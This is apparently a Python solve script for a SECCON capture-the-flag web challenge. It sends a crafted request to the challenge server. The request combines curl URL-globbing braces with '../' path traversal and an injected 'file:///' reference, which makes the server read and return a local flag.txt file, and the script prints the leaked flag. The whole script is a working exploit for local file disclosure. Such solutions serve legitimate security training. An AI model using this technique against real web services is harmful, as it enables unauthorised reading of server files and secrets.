import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"

res = httpx.get(
    BASE_URL + "/{.}./{.}./{app/public/hello.html,flag.txt}",
    params={
        "{name}": "{",
        "{": "}{",
        "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
    },
)

print("SECCON" + res.text.split("<h1>Hello, }")[1])
